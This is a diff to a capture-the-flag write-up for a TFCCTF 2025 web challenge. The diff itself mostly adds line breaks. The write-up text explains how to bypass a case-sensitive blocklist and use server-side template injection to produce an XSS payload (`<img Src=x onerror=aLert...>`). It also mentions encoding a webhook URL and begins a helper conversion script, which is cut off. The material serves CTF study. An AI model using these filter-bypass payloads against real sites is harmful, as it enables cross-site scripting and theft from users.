@@ -40,9 +40,9 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(render_page(name_to_display=name).encode("utf-8"))
 ```
-
+<br />
 As we can see the banned list check doesn't check for capital case letters.
-
+<br />
 ```py
         for b in banned:
             if b in name:
@@ -57,9 +57,11 @@ So we can enter "Src" and it will be fine.
 Now we need to think about getting a xss using open and closing tag but it's blocked but we have an ssti here in render_page function 
 <br />
 ```py
+
     templ = html_template.replace("NAME", escape_html(name_to_display or ""))
     template = Template(templ, lookup=lookup)
     return template.render(name_to_display=name_to_display, banned="&<>()")
+
 ```
 <br />
 So we can access anything from banned list which contain our needed string using the ssti we have the open and closing tag for xss in banned here, so to get `<` for example
@@ -73,13 +75,16 @@ As we can see it worked now can get a working payload like `<img src=x onerror=a
 I replaced s with S and l with L 
 <br />
 ```${banned[1]}img Src=x onerror=aLert`1`${banned[2]}```
+
 <br />
 <img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/3.png">
 <br />
+
 But if we want to insert the webhook it will contain a lot of things that blocked but we can use encoding since we have `${banned[0]}` as `&` we can use html encoding for instance `${banned[0]}#x3d` get converted to `=` 
 
 Let's make a script that will help us convert everything 
 <br />
+
 ```py
 st, nd, td = [f"${{banned[{i}]}}" for i in range(3)]
 
